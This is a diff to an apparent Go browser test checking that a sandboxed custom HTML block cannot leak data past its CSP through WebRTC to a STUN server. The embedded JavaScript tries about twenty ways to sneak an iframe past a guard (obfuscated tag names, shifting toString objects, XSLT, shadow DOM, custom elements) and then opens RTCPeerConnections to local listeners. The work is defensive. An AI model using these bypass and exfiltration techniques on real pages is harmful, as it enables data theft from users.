@@ -568,78 +568,106 @@ func TestRealBrowserAButtonOpensTheChatInANewTopic(t *testing.T) {
 }
 
 // TestRealBrowserCustomBlockSendsNothingByWebRTC: a custom block cannot carry data out past its CSP through the ICE
-// of a WebRTC connection to a STUN server of its own.
+// of a WebRTC connection to a STUN server of its own: not from its window, and no frame, where WebRTC would come back,
+// is made by any way the guard of the proxy page names; each way calls a STUN server of its own.
 func TestRealBrowserCustomBlockSendsNothingByWebRTC(t *testing.T) {
 	if os.Getenv("DECK_REAL_BROWSER") == "" {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
-	stun, err := net.ListenPacket("udp4", "127.0.0.1:0")
-	if err != nil {
-		t.Fatal(err)
-	}
-	defer stun.Close()
-	got := make(chan int, 1)
-	go func() {
-		buf := make([]byte, 2048)
-		if n, _, err := stun.ReadFrom(buf); err == nil {
-			got <- n
+	ways := []string{"window", "parent", "createElement", "createElementObject", "createElementNS", "innerHTML", "innerHTMLObject",
+		"outerHTML", "shadowInnerHTML", "insertAdjacentHTML", "setHTMLUnsafe", "shadowSetHTMLUnsafe", "write", "writeln",
+		"execCommand", "parseFromString", "createContextualFragment", "parseHTMLUnsafe", "xslt", "customElement", "html", "root"}
+	got := make(chan string, len(ways))
+	ports := map[string]string{}
+	for _, w := range ways {
+		stun, err := net.ListenPacket("udp4", "127.0.0.1:0")
+		if err != nil {
+			t.Fatal(err)
 		}
-	}()
-	e := newEnv(t, webNotesAgent())
-	e.createProject("web", webNotes)
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": `<!doctype html><html><body><p id="out">rtc</p><script>
-const leak = (w) => {
+		defer stun.Close()
+		ports[w] = stun.LocalAddr().String()
+		go func(w string) {
+			if _, _, err := stun.ReadFrom(make([]byte, 2048)); err == nil {
+				got <- w
+			}
+		}(w)
+	}
+	at, _ := json.Marshal(ports)
+	lib := `const at = ` + string(at) + `;
+const leak = (w, way) => {
   try {
-    const pc = new w.RTCPeerConnection({ iceServers: [{ urls: "stun:` + stun.LocalAddr().String() + `" }] });
+    const pc = new w.RTCPeerConnection({ iceServers: [{ urls: "stun:" + at[way] }] });
     pc.createDataChannel("leak");
     pc.createOffer().then((o) => pc.setLocalDescription(o));
   } catch (e) {}
 };
-leak(window);
-leak(parent);
-const last = () => frames[frames.length - 1];
-const tries = [
-  () => { document.body.appendChild(document.createElement("iframe")); },
-  () => { const d = document.createElement("div"); d.innerHTML = "<iframe></iframe>"; document.body.appendChild(d); },
-  () => { const r = document.createRange(); r.selectNode(document.body); document.body.appendChild(r.createContextualFragment("<iframe></iframe>")); },
-  () => { const t = document.createElement("template"); t.innerHTML = "<iframe></iframe>"; document.body.appendChild(t.content); },
-  () => { const d = document.createElement("div"); document.body.appendChild(d); d.setHTMLUnsafe("<iframe></iframe>"); },
-  () => { const d = document.createElement("div"); document.body.appendChild(d); d.innerHTML = "<iframe onload='leak(this.contentWindow)'></iframe>"; },
-  () => { const x = new DOMParser().parseFromString("<p><iframe></iframe></p>", "text/html"); const d = document.createElement("div"); document.body.append(d); d.replaceChildren(document.adoptNode(x.body.firstChild)); },
-  () => { const x = document.implementation.createHTMLDocument(""); x.body.innerHTML = "<iframe></iframe>"; const d = document.createElement("div"); document.body.append(d); d.replaceChildren(...x.body.childNodes); },
-  () => { const f = document.createElementNS("http://www.w3.org/1999/xhtml", "iframe"); document.body.append(f); },
-];
-for (const t of tries) {
-  const n = frames.length;
-  try { t(); } catch (e) {}
-  if (frames.length > n) leak(last());
+const F = "ifr" + "ame", T = "<" + F + "></" + F + ">";
+`
+	e := newEnv(t, webNotesAgent())
+	e.createProject("web", webNotes)
+	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": `<!doctype html><html><body><p id="out">rtc</p><script>
+` + lib + `
+const twice = () => { let n = 0; return { toString() { return n++ ? T : "div"; } }; };
+const box = () => { const d = document.createElement("div"); document.body.appendChild(d); return d; };
+const ways = {
+  createElement: (d) => d.appendChild(document.createElement(F)),
+  createElementObject: (d) => d.appendChild(document.createElement({ n: 0, toString() { return this.n++ ? F : "div"; } })),
+  createElementNS: (d) => d.appendChild(document.createElementNS("http://www.w3.org/1999/xhtml", F)),
+  innerHTML: (d) => { d.innerHTML = T; },
+  innerHTMLObject: (d) => { d.innerHTML = twice(); },
+  outerHTML: (d) => { const c = d.appendChild(document.createElement("p")); c.outerHTML = T; },
+  shadowInnerHTML: (d) => { d.attachShadow({ mode: "open" }).innerHTML = T; },
+  insertAdjacentHTML: (d) => d.insertAdjacentHTML("beforeend", T),
+  setHTMLUnsafe: (d) => d.setHTMLUnsafe(T),
+  shadowSetHTMLUnsafe: (d) => d.attachShadow({ mode: "open" }).setHTMLUnsafe(T),
+  write: () => document.write(T),
+  writeln: () => document.writeln(T),
+  execCommand: (d) => { d.contentEditable = "true"; d.focus(); document.execCommand("insertHTML", false, T); },
+  parseFromString: (d) => d.appendChild(document.adoptNode(new DOMParser().parseFromString(T, "text/html").body.firstChild)),
+  createContextualFragment: (d) => { const r = document.createRange(); r.selectNodeContents(d); d.appendChild(r.createContextualFragment(T)); },
+  parseHTMLUnsafe: (d) => d.appendChild(document.adoptNode(Document.parseHTMLUnsafe(T).body.firstChild)),
+  xslt: (d) => {
+    const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;, &quot;ame&quot;)}" namespace="http://www.w3.org/1999/xhtml"/></xsl:template></xsl:stylesheet>', "application/xml");
+    const x = new XSLTProcessor();
+    x.importStylesheet(xsl);
+    d.appendChild(x.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document));
+  },
+  customElement: (d) => {
+    customElements.define("x-frame", class extends HTMLIFrameElement {}, { extends: F });
+    d.appendChild(new (customElements.get("x-frame"))());
+  },
+};
+leak(window, "window");
+leak(parent, "parent");
+const seen = new Set(document.querySelectorAll(F));
+for (const [way, make] of Object.entries(ways)) {
+  const d = box();
+  try { make(d); } catch (e) {}
+  const all = [...document.querySelectorAll(F), ...(d.shadowRoot ? d.shadowRoot.querySelectorAll(F) : [])];
+  for (const f of all) if (!seen.has(f)) { seen.add(f); leak(f.contentWindow, way); }
 }
 </script></body></html>`}, nil)
 	b := newPlaywright(t)
 	b.open(e.URL + "/?token=" + token + "#/p/web/main")
 	b.until("the custom block", `document.querySelector('iframe[data-custom]')`)
-	select {
-	case n := <-got:
-		t.Fatalf("a custom block reached a STUN server of its own with %d bytes", n)
-	case <-time.After(8 * time.Second):
+	wait := func(what string) {
+		select {
+		case w := <-got:
+			t.Fatalf("%s reached a STUN server through %s", what, w)
+		case <-time.After(8 * time.Second):
+		}
 	}
-	leak := `try { const pc = new frames[0].RTCPeerConnection({ iceServers: [{ urls: "stun:` + stun.LocalAddr().String() + `" }] });
-  pc.createDataChannel("leak"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {}`
+	wait("a custom block")
 	for i, c := range []struct{ name, html string }{
-		{"a frame in the HTML of the block", `<!doctype html><html><body><iframe></iframe><script>` + leak + `</script></body></html>`},
-		{"a frame as the root of the document", `<!doctype html><html><body><script>
-try { const f = new DOMParser().parseFromString("<p><iframe></iframe></p>", "text/html").querySelector("iframe");
-  document.removeChild(document.documentElement); document.append(document.adoptNode(f)); } catch (e) {}
-` + leak + `</script></body></html>`},
+		{"a frame in the HTML of the block", `<!doctype html><html><body><iframe></iframe><script>` + lib + `leak(frames[0], "html");</script></body></html>`},
+		{"a frame as the root of the document", `<!doctype html><html><body><script>` + lib + `
+try { const f = document.createElement(F); document.removeChild(document.documentElement); document.append(f); leak(f.contentWindow, "root"); } catch (e) {}
+</script></body></html>`},
 	} {
 		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": c.html}, nil)
 		b.open(fmt.Sprintf("%s/?token=%s&case=%d#/p/web/main", e.URL, token, i))
 		b.until("the custom block again", `document.querySelector('iframe[data-custom]')`)
-		select {
-		case n := <-got:
-			t.Fatalf("%s reached a STUN server with %d bytes", c.name, n)
-		case <-time.After(8 * time.Second):
-		}
+		wait(c.name)
 	}
 }
